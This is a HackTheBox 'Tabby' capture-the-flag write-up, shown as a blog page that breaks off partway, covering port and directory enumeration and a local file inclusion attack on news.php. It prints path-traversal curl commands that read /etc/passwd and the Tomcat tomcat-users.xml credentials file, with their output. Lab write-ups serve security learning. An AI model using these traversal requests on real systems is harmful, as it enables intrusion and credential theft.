<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Tabby | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Tabby HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/tabby/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/tabby/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Tabby "><meta property="og:description" content="Tabby HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/tabby/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-11-07T17:30:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png"><meta name=twitter:title content="Tabby "><meta name=twitter:description content="Tabby HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Tabby ","item":"https://s4ch.github.io/writeups/hackthebox/tabby/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Tabby ","name":"Tabby ","description":"Tabby HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Tabby Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap ffuf curl metasploit pwncat peass fcrackzip Network enumeration Port and service discovery scan with nmap:\n# Nmap 7.80 scan initiated Sat Aug 8 13:09:36 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.194 Increasing send delay for 10.10.10.194 from 0 to 5 due to 649 out of 2162 dropped probes since last increase. Nmap scan report for 10.10.10.194 Host is up (0.032s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 8 13:28:24 2020 -- 1 IP address (1 host up) scanned in 1127.63 seconds HTTP enumeration Let’s start with the website on port 80 and do a bunch of directory busting with ffuf:\n$ ffuf -u http://10.10.10.194/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.194/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ index.php [Status: 200, Size: 14175, Words: 2135, Lines: 374] news.php [Status: 200, Size: 0, Words: 1, Lines: 1] . [Status: 200, Size: 14175, Words: 2135, Lines: 374] :: Progress: [153068/153068] :: Job [1/1] :: 773 req/sec :: Duration: [0:03:18] :: Errors: 0 :: Let’s try to do something with news.php.\nIf we check the menu on the main page, we can see that NEWS have the following link: http://megahosting.htb/news.php?file=statement\nLet’s add the local domain entries:\n$ cat /etc/hosts| grep 194 10.10.10.194 tabby.htb 10.10.10.194 megahosting.htb The link does look like LFI vulnerable.\nHTTP exploitation: LFI Let’s confirm the LFI:\n$ curl http://megahosting.htb/news.php\\?file\\=../../../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash We can also read the source code of this page: http://megahosting.htb/news.php?file=../news.php\n\u003c?php $file = $_GET['file']; $fh = fopen(\"files/$file\",\"r\"); while ($line = fgets($fh)) { echo($line); } fclose($fh); ?\u003e Let’s try to access the tomcat manager of the Tomcat server on prot 8080: http://10.10.10.194:8080/manager/html\nNo luck with default credentials, but since we have a LFI we may try to read the configuration file.\nLet’s check on which OS we are before.\n$ curl 'http://megahosting.htb/news.php?file=../../../../../../../etc/os-release' NAME=\"Ubuntu\" VERSION=\"20.04 LTS (Focal Fossa)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 20.04 LTS\" VERSION_ID=\"20.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=focal UBUNTU_CODENAME=focal If we search the tomcat package for Ubuntu focal (20.04) we find it’s in version 9.\nPS: http://megahosting.htb:8080/ also discloses the tomcat version.\nThe config file storing the manager credentials is $CATALINA_HOME/conf/tomcat-users.xml.\nOn Ubuntu $CATALINA_HOME = /usr/share/tomcat{x} where {x} is the version of tomcat eg. 7, 8, 9, etc. Also the config folder is /etc/tomcat{x}.\nBut /etc/tomcat{x} may be for older versions only.\nLet’s check the files list for tomcat9 for ubuntu: https://packages.ubuntu.com/focal/all/tomcat9/filelist\n/etc/cron.daily/tomcat9 /etc/rsyslog.d/tomcat9.conf /etc/tomcat9/policy.d/01system.policy /etc/tomcat9/policy.d/02debian.policy /etc/tomcat9/policy.d/03catalina.policy /etc/tomcat9/policy.d/04webapps.policy /etc/tomcat9/policy.d/50local.policy /lib/systemd/system/tomcat9.service /usr/lib/sysusers.d/tomcat9.conf /usr/lib/tmpfiles.d/tomcat9.conf /usr/libexec/tomcat9/tomcat-start.sh /usr/libexec/tomcat9/tomcat-update-policy.sh /usr/share/doc/tomcat9/README.Debian /usr/share/doc/tomcat9/changelog.Debian.gz /usr/share/doc/tomcat9/copyright /usr/share/tomcat9-root/default_root/META-INF/context.xml /usr/share/tomcat9-root/default_root/index.html /usr/share/tomcat9/default.template /usr/share/tomcat9/etc/catalina.properties /usr/share/tomcat9/etc/context.xml /usr/share/tomcat9/etc/jaspic-providers.xml /usr/share/tomcat9/etc/logging.properties /usr/share/tomcat9/etc/server.xml /usr/share/tomcat9/etc/tomcat-users.xml /usr/share/tomcat9/etc/web.xml /usr/share/tomcat9/logrotate.template /var/lib/tomcat9/conf /var/lib/tomcat9/logs /var/lib/tomcat9/work So it’s seems ubuntu mapped the files differently than the apache defaults, so it won’t be $TOMCAT_HOME/conf/tomcat-users.xml but $TOMCAT_HOME/etc/tomcat-users.xml.\n$ curl 'http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml' \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ","wordCount":"1704","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png","datePublished":"2020-11-07T17:30:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/tabby/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Tabby</h1><div class=post-description>Tabby HackTheBox writeup</div><div class=post-meta><span title='2020-11-07 17:30:00 +0000 UTC'>November 7, 2020</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1704 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/tabby/tabby.png alt="Tabby HackTheBox Machine"><p>Tabby - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation-lfi>HTTP exploitation: LFI</a></li><li><a href=#http-exploitation-file-upload--rce>HTTP exploitation: File upload & RCE</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation-of-machine--tomcat-to-ash>Privilege Escalation of Machine : tomcat to ash</a></li><li><a href=#privilege-escalation-of-machine--ash-to-root>Privilege Escalation of Machine : ash to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Tabby</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/259>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap ffuf curl metasploit pwncat peass fcrackzip
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service discovery scan with <a href=https://nmap.org/>nmap</a>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Sat Aug  8 13:09:36 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.194
Increasing send delay for 10.10.10.194 from 0 to 5 due to 649 out of 2162 dropped probes since last increase.
Nmap scan report for 10.10.10.194
Host is up (0.032s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  8 13:28:24 2020 -- 1 IP address (1 host up) scanned in 1127.63 seconds
</code></pre><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>Let&rsquo;s start with the website on port 80 and do a bunch of directory busting
with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.194/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.194/FUZZ
 :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Extensions       : .txt .html .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

index.php               [Status: 200, Size: 14175, Words: 2135, Lines: 374]
news.php                [Status: 200, Size: 0, Words: 1, Lines: 1]
.                       [Status: 200, Size: 14175, Words: 2135, Lines: 374]
:: Progress: [153068/153068] :: Job [1/1] :: 773 req/sec :: Duration: [0:03:18] :: Errors: 0 ::
</code></pre><p>Let&rsquo;s try to do something with <code>news.php</code>.</p><p>If we check the menu on the main page, we can see that <code>NEWS</code> have the following
link: <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a></p><p>Let&rsquo;s add the local domain entries:</p><pre tabindex=0><code>$ cat /etc/hosts| grep 194
10.10.10.194 tabby.htb
10.10.10.194 megahosting.htb
</code></pre><p>The link does look like LFI vulnerable.</p><h2 id=http-exploitation-lfi>HTTP exploitation: LFI<a hidden class=anchor aria-hidden=true href=#http-exploitation-lfi>#</a></h2><p>Let&rsquo;s confirm the LFI:</p><pre tabindex=0><code>$ curl http://megahosting.htb/news.php\?file\=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
</code></pre><p>We can also read the source code of this page:
<a href="http://megahosting.htb/news.php?file=../news.php">http://megahosting.htb/news.php?file=../news.php</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;file&#39;</span>];
</span></span><span style=display:flex><span>$fh <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;files/</span><span style=color:#e6db74>$file</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> ($line <span style=color:#f92672>=</span> <span style=color:#a6e22e>fgets</span>($fh)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span>($line);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($fh);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Let&rsquo;s try to access the tomcat manager of the Tomcat server on prot 8080:
http://10.10.10.194:8080/manager/html</p><p>No luck with default credentials, but since we have a LFI we may try to read
the configuration file.</p><p>Let&rsquo;s check on which OS we are before.</p><pre tabindex=0><code>$ curl &#39;http://megahosting.htb/news.php?file=../../../../../../../etc/os-release&#39;
NAME=&#34;Ubuntu&#34;
VERSION=&#34;20.04 LTS (Focal Fossa)&#34;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&#34;Ubuntu 20.04 LTS&#34;
VERSION_ID=&#34;20.04&#34;
HOME_URL=&#34;https://www.ubuntu.com/&#34;
SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
</code></pre><p>If we search the tomcat package for Ubuntu focal (20.04) we find it&rsquo;s in
<a href="https://packages.ubuntu.com/search?keywords=tomcat&searchon=names&suite=focal&section=all">version 9</a>.</p><p>PS: <a href=http://megahosting.htb:8080/>http://megahosting.htb:8080/</a> also discloses the tomcat version.</p><p>The config file storing the manager credentials is
<code>$CATALINA_HOME/conf/tomcat-users.xml</code>.</p><p>On Ubuntu <code>$CATALINA_HOME</code> = <code>/usr/share/tomcat{x}</code> where <code>{x}</code> is the version
of tomcat eg. 7, 8, 9, etc. Also the config folder is <code>/etc/tomcat{x}</code>.</p><p>But <code>/etc/tomcat{x}</code> may be for older versions only.</p><p>Let&rsquo;s check the files list for <code>tomcat9</code> for ubuntu:
<a href=https://packages.ubuntu.com/focal/all/tomcat9/filelist>https://packages.ubuntu.com/focal/all/tomcat9/filelist</a></p><pre tabindex=0><code>/etc/cron.daily/tomcat9
/etc/rsyslog.d/tomcat9.conf
/etc/tomcat9/policy.d/01system.policy
/etc/tomcat9/policy.d/02debian.policy
/etc/tomcat9/policy.d/03catalina.policy
/etc/tomcat9/policy.d/04webapps.policy
/etc/tomcat9/policy.d/50local.policy
/lib/systemd/system/tomcat9.service
/usr/lib/sysusers.d/tomcat9.conf
/usr/lib/tmpfiles.d/tomcat9.conf
/usr/libexec/tomcat9/tomcat-start.sh
/usr/libexec/tomcat9/tomcat-update-policy.sh
/usr/share/doc/tomcat9/README.Debian
/usr/share/doc/tomcat9/changelog.Debian.gz
/usr/share/doc/tomcat9/copyright
/usr/share/tomcat9-root/default_root/META-INF/context.xml
/usr/share/tomcat9-root/default_root/index.html
/usr/share/tomcat9/default.template
/usr/share/tomcat9/etc/catalina.properties
/usr/share/tomcat9/etc/context.xml
/usr/share/tomcat9/etc/jaspic-providers.xml
/usr/share/tomcat9/etc/logging.properties
/usr/share/tomcat9/etc/server.xml
/usr/share/tomcat9/etc/tomcat-users.xml
/usr/share/tomcat9/etc/web.xml
/usr/share/tomcat9/logrotate.template
/var/lib/tomcat9/conf
/var/lib/tomcat9/logs
/var/lib/tomcat9/work
</code></pre><p>So it&rsquo;s seems ubuntu mapped the files differently than the apache defaults,
so it won&rsquo;t be <code>$TOMCAT_HOME/conf/tomcat-users.xml</code> but
<code>$TOMCAT_HOME/etc/tomcat-users.xml</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>$ curl &#39;http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml&#39;
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>  Licensed to the Apache Software Foundation (ASF) under one or more
</span></span></span><span style=display:flex><span><span style=color:#75715e>  contributor license agreements.  See the NOTICE file distributed with
</span></span></span><span style=display:flex><span><span style=color:#75715e>  this work for additional information regarding copyright ownership.
</span></span></span><span style=display:flex><span><span style=color:#75715e>  The ASF licenses this file to You under the Apache License, Version 2.0
</span></span></span><span style=display:flex><span><span style=color:#75715e>  (the &#34;License&#34;); you may not use this file except in compliance with
</span></span></span><span style=display:flex><span><span style=color:#75715e>  the License.  You may obtain a copy of the License at
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>      http://www.apache.org/licenses/LICENSE-2.0
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>  Unless required by applicable law or agreed to in writing, software
</span></span></span><span style=display:flex><span><span style=color:#75715e>  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
</span></span></span><span style=display:flex><span><span style=color:#75715e>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
</span></span></span><span style=display:flex><span><span style=color:#75715e>  See the License for the specific language governing permissions and
</span></span></span><span style=display:flex><span><span style=color:#75715e>  limitations under the License.
</span></span></span><span style=display:flex><span><span style=color:#75715e>--&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;tomcat-users</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://tomcat.apache.org/xml&#34;</span>
</span></span><span style=display:flex><span>              <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>              <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;</span>
</span></span><span style=display:flex><span>              <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;1.0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>  NOTE:  By default, no user is included in the &#34;manager-gui&#34; role required
</span></span></span><span style=display:flex><span><span style=color:#75715e>  to operate the &#34;/manager/html&#34; web application.  If you wish to use this app,
</span></span></span><span style=display:flex><span><span style=color:#75715e>  you must define such a user - the username and password are arbitrary. It is
</span></span></span><span style=display:flex><span><span style=color:#75715e>  strongly recommended that you do NOT use one of the users in the commented out
</span></span></span><span style=display:flex><span><span style=color:#75715e>  section below since they are intended for use with the examples web
</span></span></span><span style=display:flex><span><span style=color:#75715e>  application.
</span></span></span><span style=display:flex><span><span style=color:#75715e>--&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>  NOTE:  The sample user and role entries below are intended for use with the
</span></span></span><span style=display:flex><span><span style=color:#75715e>  examples web application. They are wrapped in a comment and thus are ignored
</span></span></span><span style=display:flex><span><span style=color:#75715e>  when reading this file. If you wish to configure these users for use with the
